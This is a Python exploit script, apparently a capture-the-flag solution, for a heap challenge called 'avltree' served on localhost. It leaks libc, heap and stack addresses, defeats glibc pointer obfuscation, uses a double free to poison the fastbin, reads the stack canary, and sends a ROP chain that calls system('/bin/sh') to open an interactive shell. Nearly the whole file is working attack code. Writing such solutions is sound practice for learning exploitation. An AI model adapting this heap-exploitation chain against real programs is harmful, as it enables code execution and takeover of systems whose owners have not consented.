
from ctflib.pwn import *

e = ELF("../distribution/avltree")
libc = ELF("libc.so.6", checksec=False)
context.binary = e


def add(p, code: bytes, desc: bytes, l=None):
    if l is None:
        l = len(desc) + 1
    
    p.sendlineafter(b">", b"1")
    p.sendlineafter(b"code:", code)
    p.sendlineafter(b"length:", str(l).encode())
    p.sendlineafter(b"desc", desc)

def search(p, code: bytes):
    p.sendlineafter(b">", b"2")
    p.sendlineafter(b"code:", code)

def delete(p, code: bytes):
    p.sendlineafter(b">", b"3")
    p.sendlineafter(b"code:", code)

def deobfuscate(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val
    
def obfuscate(p, adr):
    return p^(adr>>12)

if __name__ == '__main__':
    p = remote("localhost:34569")
    add(p, b"BB1111", b"AAAA")
    add(p, b"AA1111", b"XYZ")
    add(p, b"BB1111", b"BBBB", l=0x2000)
    delete(p, b"BB1111")
    search(p, b"BB1111")
    p.recvline()
    leak = find_leak64(p.recvline())
    print(hex(leak))
    libc.address = leak - 0x203b20
    print(hex(libc.address))

    # Prevent double free crash by using up freed buf
    add(p, "BL1111", b"BLOCKER", l=0x2000)


    # Fill up tcache
    for i in range(8):
        add(p, f"TC21{str(i).zfill(2)}".encode(), b"XXXX", l=0x40)
    
    # We must delete leaf nodes only to avoid triggering double free
    deletion_order = [2,4,6,7,0,3,5]
    for i in deletion_order:
        delete(p, f"TC21{str(i).zfill(2)}".encode())

    # Allocate 4 chunks to enable double free setup
    add(p, "XX0001".encode(), b"XXXX", l=0x40)
    add(p, "XX0002".encode(), b"XXXX", l=0x40)
    add(p, "XX0003".encode(), b"XXXX", l=0x40)
    add(p, "XX0004".encode(), b"XXXX", l=0x40)


    # One chunk will contain the fake chunk header
    add(p, b"660001", b"F"*0xe8+p64(0x51), l=0x100)
    # idek chunk
    add(p, b"VC0002", b"V"*0xe8, l=0x100)

        
    delete(p, "XX0003")
    delete(p, "XX0002")

    # Grab leaked fastbin pointer
    search(p, b"XX0004")
    p.recvline()
    l = p.recvline(keepends=False)
    leak = u64(l+b"\0\0")
    leak = deobfuscate(leak)
    print(hex(leak))
    heap_base = leak - 0x28a0

    # This causes fastbin dup
    delete(p, "XX0004")

    addr = heap_base + 0x2930
    target = heap_base + 0x2aa0 - 0x10
    add(p, "XX0002".encode(), p64(obfuscate(target, addr)), l=0x40)
    add(p, "XX0003".encode(), b"XXXX", l=0x40)
    add(p, "XX0004".encode(), b"XXXX", l=0x40)
    add(p, "XX0005".encode(), b"Q"*0x18+p64(0x31)+p64(0x0000000108459d61)+p64(0)*2 +p64(libc.sym.environ))
    # Stack leak
    search(p, b"660001")
    p.recvline()
    l = p.recvline(keepends=False)
    leak = u64(l+b"\0\0")
    print(hex(leak))

    # Setup for double free again
    delete(p, "XX0004")
    delete(p, "XX0003")
    delete(p, "XX0005")

    addr = target + 0x10
    target = leak - 0x168 - 0x10
    canary_addr = libc.address -0x2898 + 1
    add(p, "XX0006".encode(), p64(obfuscate(target, addr))+b"A"*0x10+p64(0x31)+p64(0x0000000108459d61)+p64(0)*2+p64(canary_addr))
    search(p, b"660001")
    p.recvline()
    l = p.recvline(keepends=False)[:7]
    canary = u64(b"\0"+l)
    print(hex(canary))
    add(p, "XX0007".encode(), b"XXXX", l=0x40)
    add(p, "XX0008".encode(), b"XXXX", l=0x40)
    payload = p64(0x000000000002a873+libc.address) # pop rdi; pop rdp; ret
    payload += p64(next(libc.search(b"/bin/sh\0")))
    payload += p64(0)
    payload += p64(libc.sym.system)
    add(p, (b"XX0009\0\0"+p64(0x51))[:15], p64(0)+p64(canary)+p64(0)+payload, 0x40)
    p.interactive()